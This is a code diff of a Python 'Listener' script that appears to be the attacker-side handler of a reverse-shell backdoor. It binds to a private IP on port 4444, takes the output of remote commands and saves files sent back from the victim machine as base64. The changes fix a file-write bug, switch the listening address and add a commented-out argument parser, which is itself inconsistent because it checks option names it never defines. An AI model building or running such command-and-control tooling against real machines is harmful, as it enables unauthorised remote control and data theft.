@@ -3,6 +3,19 @@
 import socket
 import json
 import base64
+# import optparse
+#
+# def get_arguments():
+#     parser = optparse.OptionParser()
+#     parser.add_option("-l", "--listen", dest="listen", help="Your ip address")
+#     parser.add_option("-p", "--port", dest="port", help="Listen on Port")
+#     (options, arguments) = parser.parse_args()
+#
+#     if not options.target:
+#         parser.error("[-] Please specify your PC's IP Address , use --help for more.")
+#     elif not options.source:
+#         parser.error("[-] Please specify Incoming Port , use --help for more.")
+#     return options
 
 class Listener:
     def __init__(self, ip, port):
@@ -43,7 +56,7 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, "wb") as w_file:
-            file.write(base64.b64decode(content))
+            w_file.write(base64.b64decode(content))
             return "[+] Download Successful"
 
     def run(self):
@@ -65,6 +78,7 @@ class Listener:
 
             print(result)
 
+# options = get_arguments()
 
-my_listener = Listener("192.168.43.192", 4444)
+my_listener = Listener("172.16.99.1", 4444)
 my_listener.run()
